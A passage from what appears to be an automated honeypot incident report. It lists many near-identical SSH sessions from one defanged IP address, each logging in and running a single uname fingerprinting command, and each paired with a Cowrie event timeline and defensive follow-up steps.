| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:48` | `cowrie.session.connect` |
| `2026-08-20 19:27:48` | `cowrie.client.version` |
| `2026-08-20 19:27:49` | `cowrie.client.kex` |
| `2026-08-20 19:27:54` | `cowrie.login.success` |
| `2026-08-20 19:27:57` | `cowrie.session.params` |
| `2026-08-20 19:27:57` | `cowrie.command.input` |
| `2026-08-20 19:27:59` | `cowrie.log.closed` |
| `2026-08-20 19:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc9b03ae1b71

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:49` | `cowrie.session.connect` |
| `2026-08-20 19:27:51` | `cowrie.client.version` |
| `2026-08-20 19:27:54` | `cowrie.client.kex` |
| `2026-08-20 19:28:04` | `cowrie.login.success` |
| `2026-08-20 19:28:09` | `cowrie.session.params` |
| `2026-08-20 19:28:09` | `cowrie.command.input` |
| `2026-08-20 19:28:13` | `cowrie.log.closed` |
| `2026-08-20 19:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1be0782fd76

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:50` | `cowrie.session.connect` |
| `2026-08-20 19:27:51` | `cowrie.client.version` |
| `2026-08-20 19:27:55` | `cowrie.client.kex` |
| `2026-08-20 19:28:01` | `cowrie.login.success` |
| `2026-08-20 19:28:06` | `cowrie.session.params` |
| `2026-08-20 19:28:06` | `cowrie.command.input` |
| `2026-08-20 19:28:08` | `cowrie.log.closed` |
| `2026-08-20 19:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f06ba5af61c3

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:50` | `cowrie.session.connect` |
| `2026-08-20 19:27:51` | `cowrie.client.version` |
| `2026-08-20 19:27:55` | `cowrie.client.kex` |
| `2026-08-20 19:28:02` | `cowrie.login.success` |
| `2026-08-20 19:28:18` | `cowrie.session.params` |
| `2026-08-20 19:28:18` | `cowrie.command.input` |
| `2026-08-20 19:28:22` | `cowrie.log.closed` |
| `2026-08-20 19:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3442e0e2e815

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 117s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:51` | `cowrie.session.connect` |
| `2026-08-20 19:27:51` | `cowrie.client.version` |
| `2026-08-20 19:27:51` | `cowrie.client.kex` |
| `2026-08-20 19:27:58` | `cowrie.login.success` |
| `2026-08-20 19:29:48` | `cowrie.session.params` |
| `2026-08-20 19:29:48` | `cowrie.command.input` |
| `2026-08-20 19:29:48` | `cowrie.log.closed` |
| `2026-08-20 19:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b91240c517ef

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:51` | `cowrie.session.connect` |
| `2026-08-20 19:27:51` | `cowrie.client.version` |
| `2026-08-20 19:27:58` | `cowrie.client.kex` |
| `2026-08-20 19:28:04` | `cowrie.login.success` |
| `2026-08-20 19:28:11` | `cowrie.session.params` |
| `2026-08-20 19:28:11` | `cowrie.command.input` |
| `2026-08-20 19:28:16` | `cowrie.log.closed` |
| `2026-08-20 19:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c730e8518e

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:54` | `cowrie.session.connect` |
| `2026-08-20 19:27:55` | `cowrie.client.version` |
| `2026-08-20 19:27:58` | `cowrie.client.kex` |
| `2026-08-20 19:28:09` | `cowrie.login.success` |
| `2026-08-20 19:28:17` | `cowrie.session.params` |
| `2026-08-20 19:28:17` | `cowrie.command.input` |
| `2026-08-20 19:28:22` | `cowrie.log.closed` |
| `2026-08-20 19:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ff06348996f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:54` | `cowrie.session.connect` |
| `2026-08-20 19:27:55` | `cowrie.client.version` |
| `2026-08-20 19:27:55` | `cowrie.client.kex` |
| `2026-08-20 19:28:03` | `cowrie.login.success` |
| `2026-08-20 19:28:05` | `cowrie.session.params` |
| `2026-08-20 19:28:05` | `cowrie.command.input` |
| `2026-08-20 19:28:08` | `cowrie.log.closed` |
| `2026-08-20 19:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9db7bfb1bd71

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:54` | `cowrie.session.connect` |
| `2026-08-20 19:27:55` | `cowrie.client.version` |
| `2026-08-20 19:27:58` | `cowrie.client.kex` |
| `2026-08-20 19:28:04` | `cowrie.login.success` |
| `2026-08-20 19:28:08` | `cowrie.session.params` |
| `2026-08-20 19:28:08` | `cowrie.command.input` |
| `2026-08-20 19:28:09` | `cowrie.log.closed` |
| `2026-08-20 19:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c32f44bbabf8

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:54` | `cowrie.session.connect` |
| `2026-08-20 19:27:55` | `cowrie.client.version` |
| `2026-08-20 19:27:58` | `cowrie.client.kex` |
| `2026-08-20 19:28:06` | `cowrie.login.success` |
| `2026-08-20 19:28:10` | `cowrie.session.params` |
| `2026-08-20 19:28:10` | `cowrie.command.input` |
| `2026-08-20 19:28:14` | `cowrie.log.closed` |
| `2026-08-20 19:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dff9ecd0ea9b

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:55` | `cowrie.session.connect` |
| `2026-08-20 19:27:55` | `cowrie.client.version` |
| `2026-08-20 19:27:58` | `cowrie.client.kex` |
| `2026-08-20 19:28:04` | `cowrie.login.success` |
| `2026-08-20 19:28:12` | `cowrie.session.params` |
| `2026-08-20 19:28:12` | `cowrie.command.input` |
| `2026-08-20 19:28:17` | `cowrie.log.closed` |
| `2026-08-20 19:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f87ab46020a2

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:55` | `cowrie.session.connect` |
| `2026-08-20 19:27:55` | `cowrie.client.version` |
| `2026-08-20 19:28:01` | `cowrie.client.kex` |
| `2026-08-20 19:28:09` | `cowrie.login.success` |
| `2026-08-20 19:28:17` | `cowrie.session.params` |
| `2026-08-20 19:28:17` | `cowrie.command.input` |
| `2026-08-20 19:28:19` | `cowrie.log.closed` |
| `2026-08-20 19:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d47634206953

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:56` | `cowrie.session.connect` |
| `2026-08-20 19:27:58` | `cowrie.client.version` |
| `2026-08-20 19:28:00` | `cowrie.client.kex` |
| `2026-08-20 19:28:08` | `cowrie.login.success` |
| `2026-08-20 19:28:15` | `cowrie.session.params` |
| `2026-08-20 19:28:15` | `cowrie.command.input` |
| `2026-08-20 19:28:21` | `cowrie.log.closed` |
| `2026-08-20 19:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcf572913ef1

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:56` | `cowrie.session.connect` |
| `2026-08-20 19:27:58` | `cowrie.client.version` |
| `2026-08-20 19:28:00` | `cowrie.client.kex` |
| `2026-08-20 19:28:07` | `cowrie.login.success` |
| `2026-08-20 19:28:11` | `cowrie.session.params` |
| `2026-08-20 19:28:11` | `cowrie.command.input` |
| `2026-08-20 19:28:15` | `cowrie.log.closed` |
| `2026-08-20 19:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d3a867b0001

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:58` | `cowrie.session.connect` |
| `2026-08-20 19:28:00` | `cowrie.client.version` |
| `2026-08-20 19:28:14` | `cowrie.client.kex` |
| `2026-08-20 19:28:23` | `cowrie.login.success` |
| `2026-08-20 19:28:27` | `cowrie.session.params` |
| `2026-08-20 19:28:27` | `cowrie.command.input` |
| `2026-08-20 19:28:28` | `cowrie.log.closed` |
| `2026-08-20 19:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba6f94d3decd

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:58` | `cowrie.session.connect` |
| `2026-08-20 19:28:00` | `cowrie.client.version` |
| `2026-08-20 19:28:01` | `cowrie.client.kex` |
| `2026-08-20 19:28:09` | `cowrie.login.success` |
| `2026-08-20 19:28:16` | `cowrie.session.params` |
| `2026-08-20 19:28:16` | `cowrie.command.input` |
| `2026-08-20 19:28:23` | `cowrie.log.closed` |
| `2026-08-20 19:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b815e3f8ba

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:59` | `cowrie.session.connect` |
| `2026-08-20 19:28:00` | `cowrie.client.version` |
| `2026-08-20 19:28:03` | `cowrie.client.kex` |
| `2026-08-20 19:28:47` | `cowrie.login.success` |
| `2026-08-20 19:28:48` | `cowrie.session.params` |
| `2026-08-20 19:28:48` | `cowrie.command.input` |
| `2026-08-20 19:28:52` | `cowrie.log.closed` |
| `2026-08-20 19:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df3afc272244

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:59` | `cowrie.session.connect` |
| `2026-08-20 19:28:00` | `cowrie.client.version` |
| `2026-08-20 19:28:03` | `cowrie.client.kex` |
| `2026-08-20 19:28:08` | `cowrie.login.success` |
| `2026-08-20 19:28:13` | `cowrie.session.params` |
| `2026-08-20 19:28:13` | `cowrie.command.input` |
| `2026-08-20 19:28:16` | `cowrie.log.closed` |
| `2026-08-20 19:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca28fc014f09

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:59` | `cowrie.session.connect` |
| `2026-08-20 19:28:00` | `cowrie.client.version` |
| `2026-08-20 19:28:14` | `cowrie.client.kex` |
| `2026-08-20 19:28:27` | `cowrie.login.success` |
| `2026-08-20 19:28:35` | `cowrie.session.params` |
| `2026-08-20 19:28:35` | `cowrie.command.input` |
| `2026-08-20 19:28:47` | `cowrie.log.closed` |
| `2026-08-20 19:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1816a0ab24be

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:00` | `cowrie.session.connect` |
| `2026-08-20 19:28:00` | `cowrie.client.version` |
| `2026-08-20 19:28:03` | `cowrie.client.kex` |
| `2026-08-20 19:28:13` | `cowrie.login.success` |
| `2026-08-20 19:28:21` | `cowrie.session.params` |
| `2026-08-20 19:28:21` | `cowrie.command.input` |
| `2026-08-20 19:28:23` | `cowrie.log.closed` |
| `2026-08-20 19:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14b1e152badb

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:01` | `cowrie.session.connect` |
| `2026-08-20 19:28:03` | `cowrie.client.version` |
| `2026-08-20 19:28:04` | `cowrie.client.kex` |
| `2026-08-20 19:28:24` | `cowrie.login.success` |
| `2026-08-20 19:28:38` | `cowrie.session.params` |
| `2026-08-20 19:28:38` | `cowrie.command.input` |
| `2026-08-20 19:28:42` | `cowrie.log.closed` |
| `2026-08-20 19:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-657f48c64a6e

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:03` | `cowrie.session.connect` |
| `2026-08-20 19:28:04` | `cowrie.client.version` |
| `2026-08-20 19:28:04` | `cowrie.client.kex` |
| `2026-08-20 19:28:14` | `cowrie.login.success` |
| `2026-08-20 19:28:20` | `cowrie.session.params` |
| `2026-08-20 19:28:20` | `cowrie.command.input` |
| `2026-08-20 19:28:23` | `cowrie.log.closed` |
| `2026-08-20 19:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3e8a5b18409

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:03` | `cowrie.session.connect` |
| `2026-08-20 19:28:04` | `cowrie.client.version` |
| `2026-08-20 19:28:04` | `cowrie.client.kex` |
| `2026-08-20 19:28:10` | `cowrie.login.success` |
| `2026-08-20 19:28:23` | `cowrie.session.params` |
| `2026-08-20 19:28:23` | `cowrie.command.input` |
| `2026-08-20 19:28:24` | `cowrie.log.closed` |
| `2026-08-20 19:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-593d866a5091

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:03` | `cowrie.session.connect` |
| `2026-08-20 19:28:04` | `cowrie.client.version` |
| `2026-08-20 19:28:08` | `cowrie.client.kex` |
| `2026-08-20 19:28:21` | `cowrie.login.success` |
| `2026-08-20 19:28:25` | `cowrie.session.params` |
| `2026-08-20 19:28:25` | `cowrie.command.input` |
| `2026-08-20 19:28:27` | `cowrie.log.closed` |
| `2026-08-20 19:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1125fcec9bc

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:03` | `cowrie.session.connect` |
| `2026-08-20 19:28:04` | `cowrie.client.version` |
| `2026-08-20 19:28:04` | `cowrie.client.kex` |
| `2026-08-20 19:28:10` | `cowrie.login.success` |
| `2026-08-20 19:28:21` | `cowrie.session.params` |
| `2026-08-20 19:28:21` | `cowrie.command.input` |
| `2026-08-20 19:28:23` | `cowrie.log.closed` |
| `2026-08-20 19:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abc48ff08d78

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:04` | `cowrie.session.connect` |
| `2026-08-20 19:28:04` | `cowrie.client.version` |
| `2026-08-20 19:28:08` | `cowrie.client.kex` |
| `2026-08-20 19:28:22` | `cowrie.login.success` |
| `2026-08-20 19:28:26` | `cowrie.session.params` |
| `2026-08-20 19:28:26` | `cowrie.command.input` |
| `2026-08-20 19:28:28` | `cowrie.log.closed` |
| `2026-08-20 19:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
